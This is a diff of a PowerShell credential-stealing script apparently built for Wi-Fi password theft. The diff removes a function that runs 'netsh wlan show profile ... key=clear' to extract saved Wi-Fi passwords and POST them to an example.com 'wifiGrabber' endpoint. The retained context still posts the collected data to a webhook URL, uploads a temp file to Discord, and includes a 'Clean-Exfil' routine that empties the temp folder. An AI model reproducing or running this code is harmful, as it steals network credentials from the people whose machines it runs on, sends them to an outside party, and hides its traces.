@@ -50,17 +50,6 @@ $Body = @{
   'content' = $text
 }
 
-$uri = "https://example.com/wifiGrabber"
-    
-    # Prepare the header with the content type set to JSON
-    $headers = @{
-        "Content-Type" = "application/json"
-    }
-
-    # Send the JSON data via POST method
-    Invoke-RestMethod -Uri $uri -Method Post -Body $text -Headers $headers
-}
-
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
@@ -72,29 +61,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-
  
 
 ############################################################################################################################################################
-# Function to extract Wi-Fi profiles and send them directly
-function Send-WiFiProfiles {
 
-    # Extracting Wi-Fi profiles and their keys
-    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" |
-                    %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |
-                    %{(netsh wlan show profile name="$name" key=clear)} |
-                    Select-String "Key Content\W+\:(.+)$" |
-                    %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |
-                    %{[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} |
-                    ConvertTo-Json
-
-    # Endpoint where data will be sent
-    $uri = "https://example.com/wifiGrabber"
-    
-    # Prepare the header with the content type set to JSON
-    $headers = @{
-        "Content-Type" = "application/json"
-    }
-
-    # Send the JSON data via POST method
-    Invoke-RestMethod -Uri $uri -Method Post -Body $wifiProfiles -Headers $headers
-}
 function Clean-Exfil { 
 
 # empty temp folder
